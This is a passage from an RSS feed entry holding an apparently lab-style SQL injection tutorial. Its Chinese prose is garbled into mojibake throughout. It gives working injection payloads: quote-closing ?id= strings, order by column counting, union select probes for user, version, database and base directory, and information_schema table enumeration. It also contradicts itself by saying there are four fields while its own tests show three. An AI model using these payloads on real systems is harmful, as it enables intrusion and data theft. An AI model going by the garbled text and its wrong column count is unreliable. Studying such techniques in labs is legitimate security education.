&lt;p>â€‹	æ¨å‡ºæ•°æ®åº“çš„æŸ¥è¯¢çš„éƒ¨åˆ†è¯­å¥å¯èƒ½ä¸º&lt;code>where id = '$id'LIMIT 0,1&lt;/code>ï¼Œé‚£ä¹ˆé€šè¿‡æ„é€ é—­åˆ&lt;code>?id=1' [è¿™é‡Œæ·»åŠ è¯­å¥] --+&lt;/code>æ·»åŠ è‡ªå·±æƒ³è¦è¯­å¥ï¼Œè¯­å¥åé¢çš„&lt;code>--+&lt;/code>ä½œç”¨æ˜¯å°†åé¢çš„å…¶ä»–è¯­å¥æ³¨é‡Šæ‰ã€‚&lt;/p>
&lt;p>â€‹	é¦–å…ˆæ˜¯åˆ¤æ–­å­—æ®µä¸ªæ•°ï¼š&lt;code>?id=1' order by 1 --+&lt;/code>ï¼Œé¡µé¢æ˜¾ç¤ºæ­£å¸¸ï¼Œç›´åˆ°å°è¯•&lt;code>?id=1' order by 4 --+&lt;/code>å‘ç°æ•°æ®åº“æŠ¥é”™&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/04/BgVsGn.png" alt="">&lt;/p>
&lt;p>â€‹	è¯´æ˜æ•°æ®åº“çš„å­—æ®µå€¼åªæœ‰å››ä¸ªã€‚&lt;/p>
&lt;p>â€‹	æ¥ä¸‹æ¥æµ‹è¯•æ•°æ®çš„å›æ˜¾ä½ï¼Œæ„é€ è¯­å¥&lt;code>?id=' union select 1,2,3 --+&lt;/code>ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æœ‰ï¼Œå‰é¢&lt;code>id&lt;/code>çš„æŸ¥è¯¢ä¸€å®šæ˜¯è¦ä¸å­˜åœ¨çš„ï¼Œå› ä¸ºæ•°æ®åº“åªä¼šå›æ˜¾ç¬¬ä¸€æ¡æŸ¥è¯¢çš„æ•°æ®ï¼Œå¦‚æœç¬¬ä¸€æ¡è¯­å¥æŸ¥è¯¢æˆåŠŸåˆ™åé¢&lt;code>union&lt;/code>æ„é€ çš„è¯­å¥å°±ä¸ä¼šæ˜¾ç¤ºï¼›&lt;code>union&lt;/code>è¿æ¥æŸ¥è¯¢è¯­å¥åé¢æŸ¥è¯¢çš„å­—æ®µæ•°éœ€è¦å’Œå‰é¢çš„å­—æ®µæ•°ç›¸ç­‰ï¼Œè¯¦ç»†ç”¨æ³•å¯ä»¥è‡ªè¡ŒæŸ¥è¯¢ã€‚&lt;/p>
&lt;p>â€‹	æ‰§è¡Œåé¡µé¢æ˜¾ç¤ºã€‚&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/04/BgZAeS.png" alt="">&lt;/p>
&lt;p>â€‹	è¯´æ˜æŸ¥è¯¢è¯­å¥çš„&lt;code>2,3&lt;/code>æ˜¯å›æ˜¾ä½ï¼Œä¹‹åå°±å¯ä»¥å°†æŸ¥è¯¢çš„è¯­å¥è¿›è¡Œæ›¿æ¢ã€‚å¦‚ï¼š&lt;/p>
&lt;p>â€‹	è·å–æ•°æ®åº“ç‰ˆæœ¬ï¼Œæ•°æ®åº“è·¯å¾„ï¼Œå½“å‰ç”¨æˆ·ï¼Œå½“å‰æ•°æ®åº“ï¼š
â€‹	&lt;code>?id=' union select 1,concat_ws('_',user(),version(),database()),@@basedir --+&lt;/code>&lt;/p>
&lt;p>é¡µé¢æ˜¾ç¤º&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/04/BgZbfs.png" alt="">&lt;/p>
&lt;p>â€‹	åˆ©ç”¨å…ƒæ•°æ®åº“æ¥çˆ†è¡¨ã€çˆ†æ•°æ®&lt;/p>
&lt;p>â€‹	&lt;code>?id=' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+&lt;/code>&lt;/p></description></item></channel></rss>